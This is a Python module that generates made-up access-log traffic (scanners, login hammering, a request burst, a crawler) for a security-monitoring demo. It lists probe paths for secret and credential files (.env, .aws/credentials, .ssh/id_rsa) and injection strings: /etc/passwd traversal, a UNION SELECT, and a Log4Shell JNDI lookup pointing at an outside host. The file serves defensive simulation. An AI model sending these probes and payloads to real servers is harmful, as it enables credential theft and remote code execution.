"""The demo's scanners and attack attempts (tools/demo_traffic.py; Security, 2.21).

Every address is from 198.51.100.201-240 (RFC 5737, inside the demo's made-up hosting
list, so they show as a hosting network); every host is example.com, app.example.com (a
single-page app that answers every path it does not have with its 1,184-byte index) or the
server's own address 192.0.2.10 (a 404-byte default page). Drawn from a generator of its
own, so the people, crawlers, leads and bookings are exactly as without it.

What it makes, per day:
  sweepers    two a day that only meet the app's index and the IP's default page
  scanners    two to five a day (twelve on the wave day), each 4 to 25 probes from the
              lists below, by country; most answered 404 by example.com, some 200 with the
              app's shell or the IP's default page; some with a forged referrer of the
              site's own wp. subdomain; now and then path traversal or Log4Shell
  one leak    two days before today, /.env.production on example.com answered 200 with
              1,873 bytes: a possible exposure to check
  hammering   every ninth day, 24 to 40 POSTs to /login within three minutes
  a burst     three days before today, 360 requests within 45 seconds
  a crawler   a Chrome agent that reads robots.txt, then ten pages: a browser-like crawler
"""
from __future__ import annotations

import random
from datetime import date, datetime, timedelta, timezone

UTC = timezone.utc
APP = "app.example.com"
SERVER = "192.0.2.10"
SHELL, DEFAULT = 1_184, 404
CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/126.0.6478.127 Safari/537.36")
AGENTS = ["curl/8.7.1", "python-requests/2.31.0", "Go-http-client/1.1", CHROME,
          "Mozilla/5.0 zgrab/0.x", "Mozilla/5.0 (X11; Linux x86_64)"]
COUNTRIES = ["SG", "HK", "NL", "DE", "US", "VN", "BR", "FR", "IN", "RU"]
PROBES = [
    "/.env", "/.env.local", "/.env.production", "/.git/config", "/.git/HEAD", "/.aws/credentials",
    "/.ssh/id_rsa", "/config.json", "/serverless.yml", "/appspec.yml", "/main.tf", "/terraform.tfstate",
    "/docker-compose.yml", "/wp-login.php", "/xmlrpc.php", "/wp-config.php.bak", "/wp-admin/setup-config.php",
    "/backup.sql", "/db.zip", "/backup/", "/phpmyadmin/", "/admin", "/administrator/", "/owa/auth/logon.aspx",
    "/api/config", "/actuator/env", "/phpinfo.php", "/info.php", "/config/auth.php",
    "/storage/logs/laravel.log", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/_ignition/health-check",
]
INJECTION = ["/search?q=../../../../etc/passwd", "/?x=${jndi:ldap://example.net/a}",
             "/blog/?id=1%20union%20select%201,2,3", "/download?file=..%2f..%2fetc%2fpasswd"]
POOL = [f"198.51.100.{i}" for i in range(201, 221)]
HAMMER, BURST, CRAWLER = "198.51.100.230", "198.51.100.231", "198.51.100.233"
PAGES = ["/", "/features/", "/pricing/", "/blog/", "/blog/fall-launch", "/customers/", "/about/",
         "/guides/getting-started", "/guides/webhooks", "/contact/"]


def line(when: datetime, address: str, host: str, path: str, agent: str, status: int, size: int,
         country: str, referrer: str = "-", method: str = "GET") -> str:
    return (f'{when.astimezone(UTC).isoformat()} {address} {host} "{method} {path} HTTP/2.0" '
            f'{status} {size} "{referrer}" "{agent}" 0.004 cc={country} '
            f'ray=0000000000000000-LHR\n')


def _scanner(x: random.Random, out: list, start: datetime, span: int, forced=None) -> None:
    address, agent, cc = x.choice(POOL), x.choice(AGENTS), x.choice(COUNTRIES)
    t = start + timedelta(seconds=x.randrange(0, max(1, span - 900)))
    forged = x.random() < 0.25
    ref = "https://wp.example.com/" if forged else "-"
    paths = x.sample(PROBES, x.randrange(4, 26))
    if x.random() < 0.3:
        paths.append(x.choice(INJECTION))
    for path in paths:
        t += timedelta(seconds=x.randrange(1, 20))
        door = x.random()
        if door < 0.25:
            out.append(line(t, address, APP, path, agent, 200, SHELL, cc, ref))
        elif door < 0.4:
            out.append(line(t, address, SERVER, path, agent, 200, DEFAULT, cc))
        else:
            status = 400 if "?" in path else 404
            out.append(line(t, address, "example.com", path, agent, status, 9_400 + len(path), cc, ref))
    if forced:
        t += timedelta(seconds=7)
        out.append(line(t, address, "example.com", forced, agent, 200, 1_873, cc, ref))


def add(lines: list, first: date, today: date, tz, now: datetime, seed: int) -> None:
    """Append the scanners and attacks of every day from `first` to `today` (up to `now`)."""
    x = random.Random(seed + 3)
    days = (today - first).days
    d = first
    while d <= today:
        k = (d - first).days
        start = datetime(d.year, d.month, d.day, tzinfo=tz)
        span = 86_400 if d < today else max(60, int((now - start).total_seconds()))
        # Two sweepers a day that only ever meet the harmless pages: the app's index and the
        # IP's default page, enough paths for Skald to learn each host's fallback page.
        for host, size in ((APP, SHELL), (SERVER, DEFAULT)):
            t = start + timedelta(seconds=x.randrange(0, max(1, span - 600)))
            address, cc = x.choice(POOL), x.choice(COUNTRIES)
            for i, path in enumerate(x.sample(PROBES, x.randrange(4, 9))):
                lines.append(line(t + timedelta(seconds=3 * i), address, host, path, "Go-http-client/1.1",
                                  200, size, cc))
        n = 12 if k == days - 6 else x.randrange(2, 6)
        for i in range(n):
            _scanner(x, lines, start, span, "/.env.production" if (k == days - 2 and i == 0) else None)
        if k % 9 == 4:                               # login hammering
            t = start + timedelta(seconds=x.randrange(3_600, max(3_601, span - 600)))
            for i in range(x.randrange(24, 41)):
                status = 429 if i > 30 else 401
                lines.append(line(t + timedelta(seconds=4 * i), HAMMER, "example.com", "/login",
                                  "python-requests/2.31.0", status, 61, "VN", method="POST"))
        if k == days - 4:                            # PHP workers crashing for half an hour
            t = start + timedelta(hours=15)
            for i in range(140):
                lines.append(line(t + timedelta(seconds=13 * i), x.choice(POOL), "example.com",
                                  x.choice(["/", "/pricing/", "/wp-admin/admin-ajax.php"]),
                                  "Go-http-client/1.1", 502, 166, "US"))
        if k == days - 3:                            # a burst
            t = start + timedelta(hours=11)
            for i in range(360):
                lines.append(line(t + timedelta(milliseconds=125 * i), BURST, "example.com",
                                  x.choice(PAGES), "Scrapy/2.11 (+https://scrapy.org)", 200, 24_000, "US"))
        if k % 2 == 0 and span > 7_200:              # a browser-like crawler
            t = start + timedelta(seconds=x.randrange(0, span - 3_600))
            lines.append(line(t, CRAWLER, "example.com", "/robots.txt", CHROME, 200, 168, "DE"))
            for i, page in enumerate(x.sample(PAGES, 10)):
                lines.append(line(t + timedelta(seconds=20 * (i + 1)), CRAWLER, "example.com", page,
                                  CHROME, 200, 30_000, "DE"))
        d += timedelta(days=1)


# Security > Your stack: what the demo's hosts would answer the daily check (no network).
# example.com is WordPress on PHP 8.1 (no official fix), behind an nginx that hides its
# version; it loads its images from media.example.com, a WordPress on PHP 8.3.10 (update
# needed) whose login page is open; app.example.com is a Next.js app (Node.js, version hidden).
HOME = (b'<html><head><meta name="generator" content="WordPress 6.4.2"><title>Example</title></head>'
        b'<body><img src="https://media.example.com/wp-content/uploads/2026/10/hero.png"></body></html>')
APP_HOME = b'<html><body><div id="__next"></div><script src="/_next/static/chunks/main.js"></script></body></html>'


def stack_fetch():
    """A fetch(url, method) for stack.check that answers as the demo's servers would."""
    from skald.site_fetch import Answer, Unreachable

    def answer(status, headers, body=b""):
        return Answer(status=status, headers={k.lower(): [v] for k, v in headers.items()}, body=body)
    pages = {
        ("GET", "https://example.com/"): answer(200, {"Server": "nginx", "X-Powered-By": "PHP/8.1.2"}, HOME),
        ("HEAD", "https://example.com/wp-login.php"): answer(403, {"Server": "nginx"}),
        ("GET", "https://app.example.com/"): answer(200, {"Server": "nginx", "X-Powered-By": "Next.js"}, APP_HOME),
        ("GET", "https://media.example.com/"): answer(200, {"Server": "Apache/2.4.58 (Ubuntu)",
                                                           "X-Powered-By": "PHP/8.3.10"}),
        ("HEAD", "https://media.example.com/wp-login.php"): answer(200, {"Server": "Apache/2.4.58 (Ubuntu)"}),
    }

    def fetch(url, method):
        got = pages.get((method, url))
        if got is None:
            raise Unreachable("it did not answer in time")
        return got
    return fetch
